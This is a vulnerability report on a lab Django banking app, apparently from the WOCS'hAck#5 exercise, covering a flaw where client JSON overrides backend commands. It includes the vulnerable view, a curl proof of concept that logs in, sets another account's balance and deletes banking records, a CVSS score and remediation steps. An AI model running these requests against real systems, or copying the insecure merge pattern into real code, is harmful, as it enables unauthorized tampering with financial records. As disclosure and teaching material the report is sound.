# Description

**CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component (Injection)**
**Related: CWE-863 — Incorrect Authorization**

The `quick_transfer` view accepts an arbitrary JSON object from the client and forwards it to the banking socket backend. A default `command` and the active `sid` are set first, and then the entire client-supplied dictionary is merged over them. Because the merge happens last, the client controls every field of the backend protocol message, including `command`, `sid`, and every per-command argument such as `user_id` and `amount`. No allow-list of fields or commands is applied.

Vulnerable code (`djangoWocshack_5/Bank/views.py`):

```python
@csrf_exempt
@login_required()
def quick_transfer(request):
    try:
        data = json.loads(request.body)
    except (json.JSONDecodeError, Exception):
        return JsonResponse({"error": "invalid JSON"}, status=400)
    cli, sid = make_connection()
    if cli is not False and cli is not None:
        payload = {"command": data.get("action", "tr"), "sid": sid}
        payload.update(data)  # Client overrides command, sid and other fields
        cli.send(payload)
        response = cli.receive()
        ...
        return JsonResponse(response or {"error": "no response"})
    return JsonResponse({"error": "unavailable"})
```

Route: `djangoWocshack_5/Bank/urls.py`
(`path("api/quick-transfer/", views.quick_transfer, name="bank_quick_transfer")`), mounted under `/banking/`.

Why this is exploitable:

- `payload.update(data)` lets the client replace `command`, so any command the backend parser understands is reachable, including ones with no Django wrapper.
- The backend parser (`VRC_Banking_System_Backend/Utils/parser.py`) dispatches on `command`, including `delu` and `sb`. Its handlers `delete_user` and `set_balance` act directly on the `user_id` they receive.
- The backend only checks that the `sid` exists in its session table. It has no notion of which Django user owns the request, and it does not check whether the caller is an administrator. Any authenticated user can open a session with `make_connection()` and then issue privileged commands.
- The view is `@csrf_exempt`, disabling Django's CSRF protection for this endpoint. Cross-site exploitation may also be possible depending on browser cookie policies and request context.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Register or use any low-privilege account (e.g. `john`) and log in at `/account/login/`, saving the session cookie to `john.cookies`. | Authenticated session cookie obtained. |
| 2 | Identify the banking backend ID of a separate disposable account, then send `POST /banking/api/quick-transfer/` with body `{"action":"sb","user_id":<TARGET_ID>,"amount":999999999}`. | Django builds `{"command":"sb","sid":<new>}`, then `update(data)` adds the client-supplied fields. The backend runs `set_balance` for the target account and returns `{"status":"success"}`. |
| 3 | Send `{"command":"sb","user_id":<TARGET_ID>,"amount":1}` directly instead of using `action`. | Also accepted, because `update(data)` overrides the default `command` regardless of how it is supplied. |
| 4 | Send `{"action":"delu","user_id":<TARGET_ID>}`. | The backend runs `delete_user` and returns `{"status":"success"}`. The target banking record is removed. |

**Note:** The `user_id` parameter refers to the banking backend's user ID, which is not necessarily the Django user ID or the position of an entry in `/api/users/`.

The `command` key is initially set by the view from `action`, but the subsequent merge allows the client to override `command` directly. Using `action` is the documented form.

# PoC

The following commands were reproduced on a local WOCS'hAck#5 instance using a low-privilege account and a separate disposable banking account.

```bash
# 0) Log in and store the session cookie
# First retrieve Django's CSRF cookie
curl -sS -c john.cookies -b john.cookies \
  http://localhost:8000/account/login/ -o /dev/null

CSRF=$(awk '$6=="csrftoken" {print $7; exit}' john.cookies)

# Authenticate with a low-privilege account
read -rsp "Password: " PASS
echo

curl -sS -i -c john.cookies -b john.cookies \
  -H "Referer: http://localhost:8000/account/login/" \
  --data-urlencode "username=john" \
  --data-urlencode "password=$PASS" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  http://localhost:8000/account/login/

unset PASS CSRF

# Verify that authentication succeeded before continuing.
# A sessionid cookie alone does not prove successful authentication.

# 1) Identify the target's banking backend ID
curl -sS -b john.cookies \
  -X POST http://localhost:8000/banking/api/quick-transfer/ \
  -H "Content-Type: application/json" \
  -d '{"action":"getau"}' | python3 -m json.tool

# Enter the banking ID of a disposable test account
read -rp "Disposable target banking ID: " TARGET_ID

# 2) Set the target's balance to 999,999,999
curl -sS -b john.cookies -X POST \
  http://localhost:8000/banking/api/quick-transfer/ \
  -H "Content-Type: application/json" \
  -d "{\"action\":\"sb\",\"user_id\":${TARGET_ID},\"amount\":999999999}"
# -> {"status":"success"}

# 3) Override the command field directly
curl -sS -b john.cookies -X POST \
  http://localhost:8000/banking/api/quick-transfer/ \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"sb\",\"user_id\":${TARGET_ID},\"amount\":1}"
# -> {"status":"success"}

# 4) Delete the disposable banking account
# WARNING: Destructive operation. Use only a disposable account.
curl -sS -b john.cookies -X POST \
  http://localhost:8000/banking/api/quick-transfer/ \
  -H "Content-Type: application/json" \
  -d "{\"action\":\"delu\",\"user_id\":${TARGET_ID}}"
# -> {"status":"success"}
```

**Expected result:** The target banking account's balance is first set to `999999999`, then to `1`, and finally its banking record is deleted. All operations are performed by a non-admin account.

Deleting the banking record does not necessarily delete the corresponding Django account.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Low to moderate directly. Other backend commands (such as `getau`) can return banking user information through the same channel. Extensive sensitive-data disclosure has not been demonstrated. |
| Integrity | High. Any authenticated user can set another account's balance and modify privileged banking state. |
| Availability | High. Any authenticated user can delete another user's banking record, potentially disrupting banking functionality. |

**Overall severity: Critical (WOCS'hAck#5 vulnerability catalog).**

**CVSS 3.1 assessment:** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H` — **8.3 (High)**.

The attack is network-reachable, requires only a low-privilege account, and directly allows arbitrary balance changes and banking account deletion without user interaction.

The catalog's Critical classification is retained separately from the calculated CVSS score. The confidentiality impact is conservatively rated Low, since extensive sensitive-data disclosure has not been established by this PoC.

# Remediation

1. Stop merging client input into the backend payload. Build the payload from an explicit allow-list of permitted commands and fields, and derive the authenticated user's banking identity from a trusted server-side mapping rather than accepting it from the request body:

   ```python
   # Illustrative pseudocode; adapt to the actual banking protocol.
   cmd = data.get("action", "tr")

   if cmd != "tr":
       return JsonResponse({"error": "unsupported"}, status=400)

   bank_user_id = resolve_bank_user_id(request.user)

   payload = {
       "command": "tr",
       "sid": sid,
       "from_id": bank_user_id,
       "to_id": data.get("to_id"),
       "amount": data.get("amount"),
   }
   ```

   All transfer parameters must be validated before sending the payload. `resolve_bank_user_id` represents a trusted Django-to-banking identity lookup, not an existing project function. Django user IDs must not be assumed to match banking user IDs.

2. Never let the client set `command` or `sid`. Derive `sid` on the server and ignore any value supplied in the request body.
3. Enforce authorization on the backend, not only in the Django layer: `sb`, `delu`, `sp`, and similar administrative commands should require an admin role bound to the session. The backend should also verify that each operation is authorized for its target account.
4. Remove `@csrf_exempt` from `quick_transfer` and require a CSRF token for state-changing browser requests. CSRF protection complements, but does not replace, authorization checks.
5. Restrict or remove administrative commands from the banking parser entirely if no legitimate Django path needs them.

# Author

WOCSA
